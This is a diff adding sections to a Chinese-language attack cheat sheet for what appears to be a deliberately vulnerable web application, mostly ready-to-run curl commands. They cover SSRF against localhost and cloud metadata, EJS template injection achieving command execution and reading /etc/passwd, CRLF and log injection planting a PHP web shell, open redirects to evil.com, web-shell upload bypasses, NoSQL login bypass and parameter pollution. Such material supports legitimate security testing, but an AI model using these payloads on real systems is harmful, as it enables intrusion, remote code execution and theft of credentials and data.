@@ -416,21 +416,226 @@ curl "$TARGET/api/users?name=../../../tmp;id"
 
 ---
 
+## 7. SSRF 服务端请求伪造
+
+### 攻击点 — `POST /profile` (avatar_url 字段)
+
+`avatar_url` 通过 `curl` 命令执行，可发起到任意地址的 HTTP/协议请求。
+
+```bash
+# 内网探测 — localhost
+curl -b /tmp/cookie -X POST "$TARGET/profile" \
+  -d "email=a@b.com&bio=test&avatar_url=http://localhost:3000"
+
+# 云元数据 — AWS
+curl -b /tmp/cookie -X POST "$TARGET/profile" \
+  -d "email=a@b.com&bio=test&avatar_url=http://169.254.169.254/latest/meta-data/"
+
+# 协议探测 — gopher/file
+curl -b /tmp/cookie -X POST "$TARGET/profile" \
+  -d "email=a@b.com&bio=test&avatar_url=gopher://127.0.0.1:6379/_INFO"
+
+# URL 绕过 — xip.io
+curl -b /tmp/cookie -X POST "$TARGET/profile" \
+  -d "email=a@b.com&bio=test&avatar_url=http://127.0.0.1.xip.io:3000"
+```
+
+---
+
+## 8. SSTI 模板注入
+
+### 攻击点 — 评论/留言/资料 (EJS `<%-` 不转义渲染)
+
+```bash
+# EJS 基本探测
+curl -X POST "$TARGET/products/1/comment" \
+  -d "username=ssti&content=<%= 7*7 %>"
+
+# EJS RCE
+curl -X POST "$TARGET/products/1/comment" \
+  -d "username=ssti&content=<%= global.process.mainModule.require('child_process').execSync('id').toString() %>"
+
+# EJS 读取文件
+curl -X POST "$TARGET/contact" \
+  -d "name=ssti&email=s@t.com&message=<%= require('fs').readFileSync('/etc/passwd','utf-8') %>"
+
+# 多引擎探针
+curl -X POST "$TARGET/contact" \
+  -d "name=ssti&email=s@t.com&message={{7*7}}"
+curl -X POST "$TARGET/contact" \
+  -d "name=ssti&email=s@t.com&message=\${7*7}"
+```
+
+---
+
+## 9. CRLF 注入
+
+### 攻击点 — HTTP Header / URL参数 / 表单字段
+
+```bash
+# URL 参数 — Set-Cookie 注入
+curl "$TARGET/products?q=test%0d%0aSet-Cookie:%20hijacked=yes"
+
+# Referer/User-Agent 头注入
+curl -H "Referer: http://evil.com%0d%0aX-Injected:%20true" "$TARGET/"
+curl -H "User-Agent: <?php system(\$_GET[cmd]);?>%0d%0a" "$TARGET/"
+
+# 日志注入 (PHP shell)
+curl -H "User-Agent: <?php system(\$_GET[cmd]);?>%0d%0a" "$TARGET/"
+
+# 响应拆分
+curl "$TARGET/products?q=x%0d%0a%0d%0a<script>alert(1)</script>"
+
+# 表单注入
+curl -X POST "$TARGET/contact" \
+  -d "name=test&email=test@test.com%0d%0aBcc:attacker@evil.com&message=x"
+```
+
+---
+
+## 10. 开放重定向
+
+### 攻击点 — `GET /login?redirect=`
+
+```bash
+# 基本重定向
+curl -v "$TARGET/login?redirect=http://evil.com"
+
+# 域欺骗
+curl -v "$TARGET/login?redirect=http://target.com@evil.com"
+
+# javascript:/data: 协议
+curl -v "$TARGET/login?redirect=javascript:alert(1)"
+curl -v "$TARGET/login?redirect=data:text/html,<script>alert(1)</script>"
+
+# file: 协议
+curl -v "$TARGET/login?redirect=file:///etc/passwd"
+```
+
+---
+
+## 11. 文件上传绕过
+
+### 攻击点 — `POST /profile/upload` (无类型/扩展名过滤)
+
+```bash
+# 双扩展名
+curl -b /tmp/cookie -X POST "$TARGET/profile/upload" \
+  -F "file=@shell.php;filename=backdoor.php.jpg"
+
+# 黑名单绕过
+curl -b /tmp/cookie -X POST "$TARGET/profile/upload" \
+  -F "file=@shell.php;filename=shell.phtml"
+
+# Null byte 截断
+curl -b /tmp/cookie -X POST "$TARGET/profile/upload" \
+  -F "file=@shell.php;filename=shell.php%00.jpg"
+
+# MIME 绕过
+curl -b /tmp/cookie -X POST "$TARGET/profile/upload" \
+  -F "file=@shell.php;type=image/jpeg;filename=avatar.php"
+
+# .htaccess 覆盖
+curl -b /tmp/cookie -X POST "$TARGET/profile/upload" \
+  -F "file=@htaccess;filename=.htaccess"
+
+# SVG XSS
+curl -b /tmp/cookie -X POST "$TARGET/profile/upload" \
+  -F "file=@xss.svg;filename=image.svg"
+```
+
+---
+
+## 12. NoSQL 注入
+
+### 攻击点 — `POST /login` (JSON body)
+
+```bash
+# MongoDB $ne 登录绕过
+curl -X POST "$TARGET/login" -H "Content-Type: application/json" \
+  -d '{"username":{"$ne":""},"password":{"$ne":""}}'
+
+# MongoDB $regex 盲注
+curl -X POST "$TARGET/login" -H "Content-Type: application/json" \
+  -d '{"username":{"$regex":"^a"},"password":{"$ne":null}}'
+
+# MongoDB $where 注入
+curl -X POST "$TARGET/login" -H "Content-Type: application/json" \
+  -d '{"$where":"sleep(3000)||true","username":"x","password":"x"}'
+
+# URL 参数编码
+curl "$TARGET/api/users?name[$ne]=admin"
+```
+
+---
+
+## 13. HTTP 参数污染 (HPP)
+
+### 攻击点 — API/登录/商品搜索
+
+```bash
+# 同名参数 SQLi
+curl "$TARGET/api/users?name=admin&name=' OR 1=1 --"
+
+# 数组注入
+curl "$TARGET/api/users?name[]=admin&name[]=' OR 1=1 --"
+
+# 登录覆盖
+curl -X POST "$TARGET/login" \
+  -d "username=test&username=admin' --&password=anything"
+
+# 分隔符注入
+curl "$TARGET/api/users?name=admin,test,alice"
+curl "$TARGET/api/users?name=admin test alice"
+```
+
+---
+
+## 14. 信息泄露
+
+### 攻击点 — 敏感路径/安全头/错误页/CORS
+
+```bash
+# 敏感路径探测
+for path in /.git/HEAD /.env /package.json /data.db /Dockerfile; do
+  code=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET$path")
+  [ "$code" = "200" ] && echo "[!] 可访问: $path (HTTP $code)"
+done
+
+# CORS 策略
+curl -H "Origin: http://evil.com" -I "$TARGET/"
+
+# 安全头检查
+curl -I "$TARGET/" | grep -iE "Server|X-Powered|X-Frame|CSP"
+
+# 错误页泄露
+curl "$TARGET/nonexistent_page_12345"
+
+# PUT/TRACE 方法
+curl -X PUT -d "test" "$TARGET/test_put.txt"
+curl -X TRACE "$TARGET/"
+```
+
+---
+
 ## 攻击面汇总表
 
 | # | 路由 | 方法 | 攻击类型 | 需登录 |
 |---|------|------|----------|--------|
-| 1 | `/login` | POST | SQL 注入 | 否 |
-| 2 | `/api/users` | GET | SQL 注入 | 否 |
-| 3 | `/products` | GET | SQL 注入 | 否 |
+| 1 | `/login` | POST | SQL 注入 / NoSQL 注入 | 否 |
+| 2 | `/api/users` | GET | SQL 注入 / NoSQL / HPP | 否 |
+| 3 | `/products` | GET | SQL 注入 / HPP | 否 |
 | 4 | `/products/:id` | GET | SQL 注入 | 否 |
-| 5 | `/register` | POST | SQL 注入 | 否 |
-| 6 | `/products/:id/comment` | POST | SQL 注入 + XSS | 否 |
-| 7 | `/contact` | POST | SQL 注入 + XSS | 否 |
-| 8 | `/profile` | POST | SQL 注入 + 命令注入 | 是 |
-| 9 | `/profile/upload` | POST | 路径遍历 | 是 |
+| 5 | `/register` | POST | SQL 注入 / NoSQL | 否 |
+| 6 | `/products/:id/comment` | POST | SQL 注入 + XSS + SSTI + CRLF | 否 |
+| 7 | `/contact` | POST | SQL 注入 + XSS + SSTI + CRLF + HPP | 否 |
+| 8 | `/profile` | POST | SQL 注入 + 命令注入 + SSRF + SSTI + HPP | 是 |
+| 9 | `/profile/upload` | POST | 路径遍历 + 文件上传绕过 | 是 |
 | 10 | `/api/products` | GET | SQL 注入 | 否 |
-| 11 | `/api/*` | ALL | 模糊测试 | 否 |
+| 11 | `/api/*` | ALL | 模糊测试 + 信息泄露 | 否 |
+| 12 | `/login?redirect=` | GET | 开放重定向 | 否 |
+| 13 | `/*` | ALL | 信息泄露 (敏感路径/安全头/CORS/错误页) | 否 |
+| 14 | `/*` | ALL | CRLF 注入 (Header注入/日志注入) | 否 |
 
 ---
 
